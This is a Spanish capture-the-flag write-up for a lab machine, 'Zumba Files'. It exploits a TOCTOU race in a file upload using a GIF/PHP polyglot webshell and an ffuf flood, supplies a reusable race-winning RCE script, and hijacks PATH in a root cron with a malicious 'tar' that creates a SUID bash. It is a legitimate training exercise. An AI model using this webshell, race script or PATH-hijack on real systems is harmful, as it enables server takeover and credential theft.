# TOCTOU — Zumba Files

**Dificultad:** Media · **Categoría:** Web

Zumba Files es una plataforma ficticia de subida rápida de archivos sin registro.
El servidor guarda cada archivo con su nombre y extensión originales en el webroot
y **solo después** lo analiza, borrándolo si detecta contenido peligroso. Entre el
guardado y el borrado existe una ventana de carrera (TOCTOU, CWE-367): subiendo un
PHP disfrazado de imagen y accediendo a él de forma concurrente antes de que el
análisis lo elimine se consigue ejecución remota de código como `www-data`. Desde
ahí, un cron de root que invoca `tar` sin ruta absoluta con un directorio escribible
al frente del `$PATH` permite escalar a root.

## Objetivo

1. Enumerar la web y localizar el endpoint de subida y la carpeta de uploads.
2. Descubrir que la validación de contenido ocurre **después** de guardar el archivo.
3. Ganar la condición de carrera para ejecutar una webshell PHP antes de su borrado.
4. Enumerar el sistema y abusar de un cron de root con `$PATH` secuestrable.
5. Obtener root.

## Tipo de máquina

- **Plataforma:** Docker (DockerLabs)
- **SO:** Debian GNU/Linux 13 (trixie)
- **Categoría:** Web
- **Servicios:** Apache 2.4 + PHP (único puerto expuesto: 80)
- **Vector de entrada:** condición de carrera TOCTOU en la subida de archivos
- **Escalada:** secuestro de `$PATH` en un cron de root

## Instalación

Descomprime el ZIP y despliega con el script oficial:

```bash
unzip toctou.zip -d toctou && cd toctou
chmod +x auto_deploy.sh
./auto_deploy.sh toctou.tar
```

El script carga la imagen, arranca el contenedor y muestra su IP:

```
Máquina desplegada, su dirección IP es --> 172.17.0.2
```

En adelante se usa `172.17.0.2` como IP de la máquina.

## Escaneo de puertos

```bash
nmap -sV -p- -T4 172.17.0.2
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.69 ((Debian))
```

Solo hay un servicio web. Toda la superficie de ataque está en el puerto 80.

## Enumeración web

La aplicación es "Zumba Files", una web de subida de archivos sin registro. Tiene
tres páginas: la principal (`/`) con la caja de subida, `/archivos` con el listado
de lo subido y `/nosotros`.

```bash
curl -s http://172.17.0.2/ | grep -o '<title>.*</title>'
```

```
<title>Zumba Files — Envía archivos en segundos</title>
```

La página principal sube los archivos a `/upload.php` mediante un formulario
multipart (campo `file`). El JavaScript muestra una barra de progreso y, al terminar
la transferencia, un mensaje de **"Verificando… Analizando el archivo en busca de
contenido no permitido"**: hay un análisis que introduce un retraso. Tras subir, el
archivo queda accesible en `/uploads/<nombre>` y aparece listado en `/archivos`.

Probamos primero una imagen legítima:

```bash
printf '\x89PNG\x0d\x0a\x1a\x0afoobar' > real.png
curl -s -F "file=@real.png;type=image/png" http://172.17.0.2/upload.php
```

```json
{"ok":true,"url":"\/uploads\/real.png"}
```

Ahora un PHP plano:

```bash
printf '<?php system($_GET["cmd"]); ?>' > plain.php
curl -s -F "file=@plain.php;type=image/png" http://172.17.0.2/upload.php
```

```json
{"ok":false,"error":"Solo se permiten imágenes (PNG, JPG, GIF o BMP)."}
```

La respuesta es **inmediata**: existe una comprobación rápida de cabecera por *magic
bytes* que rechaza lo que no empieza por una firma de imagen (PNG, JPG, GIF, BMP).
Esta comprobación no mira la extensión del archivo, solo los primeros bytes.

## La condición de carrera (TOCTOU)

El truco es un *polyglot*: un archivo que empieza con la firma `GIF89a` (para pasar
la comprobación de cabecera) pero cuyo nombre acaba en `.php` y contiene código PHP.
El texto previo a `<?php` se emite como salida inocua y no impide la ejecución.

```bash
printf 'GIF89a;\n<?php system($_GET["cmd"]); ?>\n' > shell.php
curl -s -F "file=@shell.php;type=image/gif" http://172.17.0.2/upload.php
```

Tras **~1 segundo** de espera:

```json
{"ok":false,"error":"El análisis detectó contenido potencialmente peligroso. Archivo rechazado."}
```

Es decir: la cabecera `GIF89a` pasa el primer filtro, el archivo **se guarda** en
`/uploads/shell.php`, y solo **después** el análisis profundo detecta el `<?php` y lo
**borra**. Ese retraso es la ventana TOCTOU.

Clave del vector: la petición de subida **no responde hasta que el análisis termina**
(y para entonces el archivo ya ha sido borrado). Por tanto, subir y *luego* acceder
siempre llega tarde. Hay que **solapar** el acceso con la subida todavía en vuelo:
mientras una subida está "verificando", el `shell.php` existe y es ejecutable.

### Ganando la carrera

Lanzamos en paralelo un bucle que sube el polyglot sin parar y un flood de peticiones
GET al archivo. Usamos `ffuf` para el flood por su alto ritmo de peticiones:

```bash
# Terminal 1: subidas continuas del polyglot
printf 'GIF89a;\n<?php system($_GET["cmd"]); ?>\n' > shell.php
while true; do
  curl -s -F "file=@shell.php;type=image/gif" http://172.17.0.2/upload.php >/dev/null
done

# Terminal 2: flood de accesos con ffuf (cb = cache-buster como punto de fuzz)
seq 1 6000 > wl.txt
ffuf -u "http://172.17.0.2/uploads/shell.php?cmd=id&cb=FUZZ" -w wl.txt -t 80 -mr "uid="
```

`ffuf` filtra (`-mr "uid="`) las respuestas que contienen la salida del comando, es
decir, los aciertos en los que hemos pillado el archivo vivo:

```
1337                    [Status: 200, Size: 62, Words: 3, Lines: 3, Duration: 3383ms]
1360                    [Status: 200, Size: 62, Words: 3, Lines: 3, Duration: 3385ms]
1321                    [Status: 200, Size: 62, Words: 3, Lines: 3, Duration: 3391ms]
...
```

Cientos de aciertos: la carrera se gana de forma consistente. Comprobamos la ejecución
de un acierto directamente:

```bash
curl -s -F "file=@shell.php;type=image/gif" http://172.17.0.2/upload.php >/dev/null &
curl -s "http://172.17.0.2/uploads/shell.php?cmd=id"
```

```
GIF89a;
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Tenemos **RCE como `www-data`**. El prefijo `GIF89a;` es la parte de imagen del
polyglot, que se emite antes de la salida del comando.

### Ejecutar comandos a voluntad

Como cada archivo subido vive solo ~1 s, conviene un pequeño script que gane la
carrera y ejecute un comando arbitrario, reutilizable para toda la fase siguiente:

```bash
#!/bin/bash
# rce.sh "<comando>" — gana la carrera y ejecuta el comando como www-data
IP=172.17.0.2
printf 'GIF89a;\n<?php system($_GET["c"]); ?>\n' > w.php
( end=$((SECONDS+12)); while [ $SECONDS -lt $end ]; do
    curl -s -F "file=@w.php;type=image/gif" http://$IP/upload.php >/dev/null
  done ) &
for i in $(seq 1 6000); do
  out=$(curl -s -G --max-time 2 "http://$IP/uploads/w.php" \
        --data-urlencode "c=echo ===OK===; $1")
  case "$out" in *===OK===*) printf '%s\n' "${out##*===OK===}"; break;; esac
done
```

```bash
./rce.sh 'uname -a'
```

```
Linux 07d256cf3a73 6.12.41+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.41-1 x86_64 GNU/Linux
```

## Escalada de privilegios

Con el RCE enumeramos tareas programadas:

```bash
./rce.sh 'cat /etc/cron.d/zumba-backup'
```

```
# Copia de seguridad de las subidas de Zumba Files (cada minuto)
* * * * * root /opt/zumba/backup.sh >/dev/null 2>&1
```

Un cron ejecuta `/opt/zumba/backup.sh` **como root** cada minuto. Vemos el script:

```bash
./rce.sh 'cat /opt/zumba/backup.sh'
```

```bash
#!/bin/bash
# ...
# NOTA del equipo: cargamos nuestro directorio de utilidades propio delante
# del PATH para poder usar versiones "tuneadas" de las herramientas de backup.
export PATH=/opt/zumba/bin:$PATH

STAMP=$(date +%Y%m%d-%H%M%S)
cd /var/www/html/uploads || exit 0
tar -czf "/var/backups/uploads-${STAMP}.tar.gz" . 2>/dev/null
```

Dos problemas combinados:

1. El script antepone `/opt/zumba/bin` al `$PATH`.
2. Invoca `tar` **sin ruta absoluta**, así que se resolverá primero en `/opt/zumba/bin`.

¿Podemos escribir en ese directorio?

```bash
./rce.sh 'ls -la /opt/zumba'
```

```
drwxr-xr-x 1 root     root     4096 ... .
-rwxr-xr-x 1 root     root      755 ... backup.sh
drwxrwxr-x 1 www-data www-data 4096 ... bin
```

`/opt/zumba/bin` pertenece a `www-data` y es escribible. Plantamos ahí un `tar`
malicioso que crea una copia de `bash` con SUID root:

```bash
./rce.sh 'printf "#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod 4755 /tmp/rootbash\n" > /opt/zumba/bin/tar; chmod +x /opt/zumba/bin/tar; echo COLOCADO'
```

```
COLOCADO
```

Esperamos a que el cron se dispare (máximo 1 minuto). Comprobamos que aparece el
binario con SUID:

```bash
./rce.sh 'ls -la /tmp/rootbash'
```

```
-rwsr-xr-x 1 root root 1298416 ... /tmp/rootbash
```

El cron ha ejecutado nuestro `tar` como root y ha creado un `bash` SUID root.
Ya solo queda invocarlo preservando privilegios (`-p`):

```bash
./rce.sh '/tmp/rootbash -p -c "id; cat /etc/shadow | head -1"'
```

```
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
root:*:20746:0:99999:7:::
```

`euid=0(root)` y lectura de `/etc/shadow`: **somos root**. Máquina comprometida.

## Resumen de la cadena

1. **Enumeración:** web de subida con validación de contenido diferida.
2. **TOCTOU:** polyglot `GIF89a` + `.php` que pasa el filtro de cabecera; acceso
   concurrente durante la ventana de ~1 s antes del borrado → **RCE como www-data**.
3. **PrivEsc:** cron de root que llama a `tar` sin ruta absoluta con `/opt/zumba/bin`
   (escribible por www-data) al frente del `$PATH` → `tar` malicioso → **root**.
